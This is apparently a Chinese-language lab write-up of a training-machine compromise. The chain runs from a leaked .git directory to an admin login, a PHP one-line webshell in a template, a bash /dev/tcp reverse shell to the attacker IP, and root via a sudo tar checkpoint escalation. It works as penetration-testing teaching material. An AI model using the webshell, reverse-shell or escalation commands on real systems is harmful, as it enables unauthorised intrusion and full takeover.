---
title: 靶机实战1：.git 泄露到 RCE 提权全流程
date: 2026-10-12
tags:
  - 信息泄露
  - 渗透测试
  - Writeup
categories: 靶机实战
---

## 目标信息

| 项目 | 内容 |
|------|------|
| 靶机 IP | 10.10.1.49 |
| 漏洞类型 | 敏感信息泄露 + RCE + 权限提升 |
| 攻击机 IP | 172.16.12.75 |

---

## 一、信息收集

### 1. 端口扫描

```bash
# 全端口扫描，跳过主机发现
nmap -Pn -p- 10.10.1.49
# Web 指纹识别
whatweb http://10.10.1.49
```

![nmap 扫描结果](/img/writeup/01-nmap.png)

![whatweb 指纹识别](/img/writeup/02-whatweb.png)

**结果：**
- 开放端口：22/tcp (SSH)、80/tcp (HTTP)
- Web 服务：Apache/2.4.58 (Ubuntu)
- 操作系统：Ubuntu Linux

### 2. 目录爆破

```bash
# 目录爆破，猜测 .php 后缀，过滤 403/404
dirsearch -u http://10.10.1.49 -e php -x 403,404
```

![dirsearch 目录爆破](/img/writeup/03-dirsearch.png)

**结果：** 发现 `.git` 目录可访问。

---

## 二、.git 泄露利用

### 1. 确认泄露

```bash
# 读取 HEAD 文件，确认仓库分支引用
curl -s http://10.10.1.49/.git/HEAD
# 读取提交历史日志
curl -s http://10.10.1.49/.git/logs/HEAD
```

![.git/HEAD](/img/writeup/04-git-head.png)

![.git/logs/HEAD](/img/writeup/05-git-logs.png)

### 2. 拉取源码

```bash
# git-dumper 拉取完整 .git 仓库
git_dumper.py -j 10 http://10.10.1.49/.git ../dump_git
cd ../dump_git
# 列出文件
ls -la
# 查看提交历史摘要
git log --oneline
# 查看每次提交的完整 diff
git log -p
```

![git-dumper 拉取源码](/img/writeup/06-git-dumper.png)

![文件列表](/img/writeup/07-ls-la.png)

![git log --oneline](/img/writeup/08-git-log-oneline.png)

![git log -p](/img/writeup/09-git-log-p.png)

### 3. 提取凭证

从提交历史中获取管理员账号密码：

```
admin : P0rtal_Adm1n_2026!
```

---

## 三、漏洞利用

### 1. 登录后台

![登录后台](/img/writeup/10-login.png)

### 2. 模板写入 Webshell

进入模板设置，编辑 footer.php：

![模板设置页面](/img/writeup/11-template-settings.png)

写入一句话木马：

```php
<?php
  // 命令执行，通过 GET 参数 c 传入
  system($_GET['c']);
?>
```

![写入 webshell](/img/writeup/12-webshell.png)

测试命令执行：

```bash
# 访问 footer.php，通过 ?c=id 执行 id 命令
curl -s http://10.10.1.49/templates/footer.php?c=id
```

![命令执行 id](/img/writeup/13-cmd-id.png)

**结果：** 返回 `uid=33(www-data)`，确认 RCE。

### 3. 反弹 Shell

攻击机监听 4444 端口：

```bash
nc -lvnp 4444
```

![nc 监听](/img/writeup/14-nc-listen.png)

靶机执行反弹：

```bash
# 通过 webshell 执行反弹命令，连接攻击机 4444 端口
curl -s -G http://10.10.1.49/templates/footer.php \
  --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/172.16.12.75/4444 0>&1'"
```

![反弹 shell](/img/writeup/15-reverse-shell.png)

拿到 shell：

![拿到 shell](/img/writeup/16-got-shell.png)

升级交互式终端：

```bash
# Python 启动伪终端
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z 挂起后执行，恢复终端输入输出
stty raw -echo; fg
```

![pty 升级](/img/writeup/17-pty-upgrade.png)

---

## 四、权限提升

### 1. 检查 sudo 权限

```bash
# 列出当前用户可 sudo 执行的命令
sudo -l
```

![sudo -l](/img/writeup/18-sudo-l.png)

**结果：** `tar` 可无密码以 root 执行。

### 2. tar 提权

```bash
# 利用 tar 的 checkpoint 机制执行命令
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

![tar 提权](/img/writeup/19-tar-privesc.png)

验证：

```bash
id
# uid=0(root)
```

---

## 五、获取 Flag

```bash
# 搜索 flag 文件
find / -name 'flag*' -type f 2>/dev/null
# 读取 flag
cat /var/www/flag_user.txt
```

![查找 flag](/img/writeup/20-find-flag.png)

![获取 flag](/img/writeup/21-flag.png)

```
flag{yx_g1t_l34k_s0urc3_t0_w3bsh3ll}
```

---

## 攻击链

```
端口扫描 → 目录爆破 → .git 泄露
    → git-dumper 拉源码 → 获取管理员凭证
    → 登录后台 → 模板写入 webshell
    → 反弹 shell → sudo tar 提权
    → root flag
```

**漏洞评级：严重**
- 根源：.git 目录未做访问控制
- 影响：源码泄露 → 凭证泄露 → RCE → 提权至 root
